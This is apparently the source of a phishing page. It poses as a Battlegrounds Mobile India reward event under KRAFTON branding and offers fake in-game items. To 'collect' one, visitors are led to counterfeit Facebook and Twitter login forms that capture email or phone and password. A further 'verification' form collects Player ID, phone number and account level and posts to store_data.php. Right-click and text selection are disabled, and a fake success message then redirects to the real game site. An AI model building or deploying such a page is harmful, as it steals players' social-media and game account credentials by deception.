<?php
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.navbar {
	background: url(https://i.ibb.co/sRkC09K/IMG-20220608-090738-172.jpg) top center / 100% no-repeat;
	width: 100%;
	height: 65px;
}
.event-theme {
	width: 98%;
	height: 53px;
	margin-top: -15px;
	margin-bottom: -15px;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 15px;
    overflow: hidden;
    text-align: center;
	font-family: Teko;
    white-space: nowrap;
    width: 90%;
    font-size: 61px;
    text-shadow: 0px 1.1px 0px #f1eade;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #f1eade;
    cursor: default;
    font-size: 1.2rem;
	font-family: Teko;
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #f1eade;
	border-bottom: 1px solid #f1eade;
    content: "";
    height: 2px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 8px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 8px;
}
.event-notification-wrapper {
	width:90%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:20px;
	border-bottom:2px solid #f1d7ff;
	display:block;
}
.event-notification-content {
	background:#f4af02;
	width:100%;
	height:auto;
	margin-bottom:1px;
	padding-left:5px;
	color:#000;
	font-size:19px;
	font-family:Teko;
	text-align:left;
}
.event-notification-content i {
	padding-right:5px;
	color:#000;
	font-size:25px;
	float: left;
}
.event-notification-content-timer i {
    padding-top:2px;
	padding-right:5px;
	color:#000;
	font-size:19px;
}
.event-notification-content-timer {
	margin-top:2px;
	margin-right:5px;
	float: right;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 15px;
}
.item img, .item button {
	border:1.5px solid #E6C164;
}
.nav-popup-title {
    padding-left: 15px;
	padding-top: 2px;
	color: #000;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: left;
}
.nav-popup img {
	width: 20px;
	height: 20px;
	margin-top: 5px;
	margin-right: 10px;
	color: #000;
	float: right;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 85%;
    height: auto;
    padding: 8px;
    margin-left:auto;
	margin-right:auto;
    color: #000;
	font-size: 15px;
    font-family:Teko;
    border-radius: 2px;
    border: none;
    outline: none;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
	margin-bottom: 3px;
}
.popup-btn-twitter {
    background: #08a0e9;
	margin-bottom: 20px;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #000;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #000;
}
.popup-form select {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 6px;
	color: #000;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
</style>
<div class="container">
<div class="navbar">
<div class="navbar-right">
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img src="img/header.jpg">
</div> <!--- header --->
<div class="event-theme">
</div> <!--- event-theme --->
<div class="event-subtitle"><span></span></div> <!--- event-subtitle --->
<div class="event-notification-wrapper">
<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i> Rewards will be available until <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="box">
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://www.battlegroundsmobileindia.com/common/img/common/footerlg.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer-log">
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png">
<div class="txt-login-fb">Log in to your Facebook account to connect to Battlegrounds Mobile.</div> <!--- txt-login-fb --->
<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- showPassword --->
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- hidePassword --->
<input type="hidden" name="login" id="login-facebook" value="FACEBOOK" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name --->
<div class="language-name">India</div> <!--- language-name --->
<div class="language-name">Türkçe</div> <!--- language-name --->
<div class="language-name">Tiếng Việt</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png">
</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required>
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- TwitterShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- TwitterHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required>
</div> <!--- input-box-twitter --->
<input type="hidden" name="login" id="login-twitter" value="TWITTER" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Complete your account details</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<form action="store_data.php" method="post">
<input type="hidden" name="login" id="validateLogin" readonly>
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->
	
	
<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-alert --->
<div class="popup-form-footer">
</div> <!--- popup-form-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Rewards</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Hi,
<br>
Thank you for joining Battleground India Event
<br>
<i class="fa fa-check-circle fa-2x"></i>
<br>
Your account has been successfully processed
<br>
The reward will be sent via in-game Mail
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://www.battlegroundsmobileindia.com/';">Close</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>
<script src="js/showHide.js"></script>
<script>
// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});
</script>

</body>
</html>